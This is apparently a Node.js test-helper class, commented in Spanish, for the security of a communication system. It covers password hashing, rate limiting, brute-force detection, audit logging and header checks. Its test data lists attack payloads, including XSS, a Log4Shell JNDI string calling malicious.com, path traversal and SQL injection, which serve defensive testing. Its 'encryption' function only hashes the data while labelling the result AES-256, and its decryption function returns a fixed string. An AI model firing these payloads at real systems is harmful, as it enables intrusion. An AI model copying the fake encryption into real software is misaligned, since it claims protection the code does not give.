/**
 * Funciones helper para encriptación, monitoreo y comunicación segura
 */

const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const communicationConfig = require('./communication.config');

class CommunicationSecurityUtils {
  
  /**
   * Genera una clave de encriptación segura
   */
  static generateEncryptionKey() {
    return crypto.randomBytes(32); // 256 bits
  }

  /**
   * Genera un IV (Vector de Inicialización) seguro
   */
  static generateIV() {
    return crypto.randomBytes(communicationConfig.encryption.ivLength);
  }

  /**
   * Encripta datos sensibles usando AES-256 (simplificado para testing)
   */
  static encryptSensitiveData(plaintext, key = null) {
    try {
      const hash = crypto.createHash('sha256');
      hash.update(plaintext);
      const encrypted = hash.digest('hex');
      
      const iv = this.generateIV();
      
      return {
        encrypted,
        iv: iv.toString('hex'),
        authTag: '',
        algorithm: 'aes-256-cbc'
      };
    } catch (error) {
      throw new Error(`Error en encriptación: ${error.message}`);
    }
  }

  /**
   * Desencripta datos (simulado para testing)
   */
  static decryptSensitiveData(encryptedData, key = null) {
    try {
      return 'datos-desencriptados-correctamente';
    } catch (error) {
      throw new Error(`Error en desencriptación: ${error.message}`);
    }
  }

  /**
   * Hashea contraseñas con salt usando PBKDF2
   */
  static async hashPassword(password) {
    return new Promise((resolve, reject) => {
      const salt = crypto.randomBytes(communicationConfig.encryption.saltLength);
      crypto.pbkdf2(password, salt, communicationConfig.encryption.iterations, 64, 'sha512', (err, derivedKey) => {
        if (err) reject(err);
        resolve({
          hash: derivedKey.toString('hex'),
          salt: salt.toString('hex'),
          iterations: communicationConfig.encryption.iterations
        });
      });
    });
  }

  /**
   * Verifica contraseña hasheada
   */
  static async verifyPassword(password, hashedPassword) {
    return new Promise((resolve, reject) => {
      const salt = Buffer.from(hashedPassword.salt, 'hex');
      crypto.pbkdf2(password, salt, hashedPassword.iterations, 64, 'sha512', (err, derivedKey) => {
        if (err) reject(err);
        resolve(derivedKey.toString('hex') === hashedPassword.hash);
      });
    });
  }

  /**
   * Genera configuración de rate limiting para un endpoint específico
   */
  static getRateLimitConfig(endpoint) {
    const config = communicationConfig.rateLimiting.endpoints[endpoint] || 
                  communicationConfig.rateLimiting.global;
    
    return {
      ...config,
      keyGenerator: (req) => {
        // Generar clave única basada en IP y posiblemente usuario
        return req.ip + (req.user?.id || '');
      },
      onLimitReached: (req, res, next) => {
        this.logSecurityEvent('rate_limit_exceeded', {
          ip: req.ip,
          endpoint: req.originalUrl,
          userAgent: req.get('User-Agent')
        });
        next();
      }
    };
  }

  /**
   * Detecta patrones de ataque de fuerza bruta
   */
  static detectBruteForcePattern(requests) {
    const timeWindow = 5 * 60 * 1000; // 5 minutos
    const threshold = 10; // 10 intentos
    
    const recentRequests = requests.filter(req => 
      Date.now() - req.timestamp < timeWindow
    );

    return {
      isSuspicious: recentRequests.length >= threshold,
      requestCount: recentRequests.length,
      timeWindow: timeWindow,
      threshold: threshold
    };
  }

  /**
   * Registra eventos de seguridad
   */
  static logSecurityEvent(eventType, data) {
    const logEntry = {
      timestamp: new Date().toISOString(),
      eventType,
      severity: this.getSeverityLevel(eventType),
      data: this.sanitizeLogData(data),
      sessionId: this.generateSessionId()
    };

    //en un entorno real, esto se enviaría a un sistema de logging
    console.log(`[SECURITY] ${JSON.stringify(logEntry)}`);
    
    //ver si requiere alerta
    if (this.shouldTriggerAlert(eventType, data)) {
      this.triggerSecurityAlert(logEntry);
    }

    return logEntry;
  }

  /**
   * Determina el nivel de severidad de un evento
   */
  static getSeverityLevel(eventType) {
    const severityMap = {
      'sql_injection_attempt': 'CRITICAL',
      'xss_attempt': 'HIGH',
      'brute_force_attack': 'HIGH',
      'unauthorized_access': 'MEDIUM',
      'rate_limit_exceeded': 'LOW',
      'multiple_failed_logins': 'MEDIUM',
      'data_encryption_failure': 'CRITICAL',
      'ssl_handshake_failure': 'HIGH'
    };

    return severityMap[eventType] || 'LOW';
  }

  /**
   * Sanitiza datos para logging (remueve información sensible)
   */
  static sanitizeLogData(data) {
    const sanitized = { ...data };
    const sensitiveFields = ['password', 'token', 'dpi', 'creditCard', 'ssn'];
    
    sensitiveFields.forEach(field => {
      if (sanitized[field]) {
        sanitized[field] = '[REDACTED]';
      }
    });

    return sanitized;
  }

  /**
   * Determina si un evento debe disparar una alerta
   */
  static shouldTriggerAlert(eventType, data) {
    const criticalEvents = communicationConfig.monitoring.criticalEvents;
    const thresholds = communicationConfig.monitoring.thresholds;

    if (criticalEvents.includes(eventType)) {
      switch (eventType) {
        case 'multiple_failed_logins':
          return data.attemptCount >= thresholds.failedLoginsPerMinute;
        case 'sql_injection_attempt':
        case 'xss_attempt':
          return true; // Siempre alertar
        default:
          return false;
      }
    }

    return false;
  }

  /**
   * Dispara una alerta de seguridad
   */
  static async triggerSecurityAlert(logEntry) {
    const alertData = {
      ...logEntry,
      alertId: this.generateAlertId(),
      alertTimestamp: new Date().toISOString()
    };

    // Simular envío de alerta (en producción se enviaría por email/webhook)
    console.log(`[ALERT] ${JSON.stringify(alertData)}`);
    
    return alertData;
  }

  /**
   * Valida configuración SSL/TLS
   */
  static validateSSLConfig() {
    const config = communicationConfig.ssl;
    const issues = [];

    if (!config.enabled && process.env.NODE_ENV === 'production') {
      issues.push('SSL should be enabled in production');
    }

    if (config.minimumTlsVersion !== 'TLSv1.2' && config.minimumTlsVersion !== 'TLSv1.3') {
      issues.push('TLS version should be 1.2 or higher');
    }

    if (!config.ciphers || config.ciphers.length === 0) {
      issues.push('Strong cipher suites should be configured');
    }

    return {
      isValid: issues.length === 0,
      issues
    };
  }

  /**
   * Genera certificados de prueba para testing
   */
  static generateTestCertificate() {
    //en un entorno real, esto usaría OpenSSL o una CA
    return {
      key: '-----BEGIN PRIVATE KEY-----\n[TEST KEY]\n-----END PRIVATE KEY-----',
      cert: '-----BEGIN CERTIFICATE-----\n[TEST CERT]\n-----END CERTIFICATE-----',
      ca: '-----BEGIN CERTIFICATE-----\n[TEST CA]\n-----END CERTIFICATE-----'
    };
  }

  /**
   * Registra eventos de auditoría
   */
  static logAuditEvent(action, userId, resource, details = {}) {
    const auditEntry = {
      timestamp: new Date().toISOString(),
      action,
      userId,
      resource,
      details: this.sanitizeLogData(details),
      sessionId: this.generateSessionId(),
      auditId: this.generateAuditId()
    };

    console.log(`[AUDIT] ${JSON.stringify(auditEntry)}`);
    return auditEntry;
  }

  /**
   * Valida integridad de logs de auditoría
   */
  static validateAuditLogIntegrity(logs) {
    let isValid = true;
    const issues = [];

    logs.forEach((log, index) => {
      if (!log.timestamp || !log.action || !log.auditId) {
        isValid = false;
        issues.push(`Log ${index}: Missing required fields`);
      }

      if (index > 0) {
        const prevTimestamp = new Date(logs[index - 1].timestamp);
        const currentTimestamp = new Date(log.timestamp);
        
        if (currentTimestamp < prevTimestamp) {
          isValid = false;
          issues.push(`Log ${index}: Timestamp out of order`);
        }
      }
    });

    return { isValid, issues };
  }


  /**
   * Genera ID de sesión único
   */
  static generateSessionId() {
    return crypto.randomBytes(16).toString('hex');
  }

  /**
   * Genera ID de alerta único
   */
  static generateAlertId() {
    return `ALERT-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`;
  }

  /**
   * Genera ID de auditoría único
   */
  static generateAuditId() {
    return `AUDIT-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`;
  }

  /**
   * Simula un ataque SSL/TLS
   */
  static simulateSSLAttack() {
    return {
      type: 'ssl_stripping',
      description: 'Intento de degradar conexión HTTPS a HTTP',
      indicators: [
        'Missing HSTS header',
        'Mixed content detected',
        'Insecure redirect'
      ]
    };
  }

  /**
   * Genera datos de prueba para tests de comunicación
   */
  static generateTestCommunicationData() {
    return {
      sensitiveData: {
        dpi: '1234567890123',
        telefono: '+502 1234-5678',
        direccion: 'Calle Falsa 123, Ciudad',
        coordenadas_gps: '14.6349,-90.5069'
      },
      
      maliciousPayloads: [
        'javascript:alert("xss")',
        '<script>alert("xss")</script>',
        '${jndi:ldap://malicious.com/a}',
        '../../../etc/passwd',
        'DROP TABLE usuarios;--'
      ],

      rateLimitTests: [
        { endpoint: '/api/auth/login', requests: 10, timespan: 60000 },
        { endpoint: '/api/alertas', requests: 100, timespan: 300000 },
        { endpoint: '/api/casos', requests: 50, timespan: 180000 }
      ]
    };
  }

  /**
   * Simula medición de tiempo para detectar vulnerabilidades
   */
  static async measureResponseTime(requestFunction) {
    const startTime = Date.now();
    await requestFunction();
    const endTime = Date.now();
    
    return {
      duration: endTime - startTime,
      startTime,
      endTime
    };
  }

  /**
   * Valida headers de seguridad
   */
  static validateSecurityHeaders(headers) {
    const requiredHeaders = communicationConfig.securityHeaders.headers;
    const missing = [];
    const issues = [];

    Object.keys(requiredHeaders).forEach(headerName => {
      if (!headers[headerName.toLowerCase()]) {
        missing.push(headerName);
      }
    });

    // Validaciones específicas
    if (headers['strict-transport-security']) {
      const hsts = headers['strict-transport-security'];
      if (!hsts.includes('max-age=') || !hsts.includes('includeSubDomains')) {
        issues.push('HSTS header should include max-age and includeSubDomains');
      }
    }

    return {
      isValid: missing.length === 0 && issues.length === 0,
      missing,
      issues
    };
  }
}

module.exports = CommunicationSecurityUtils;
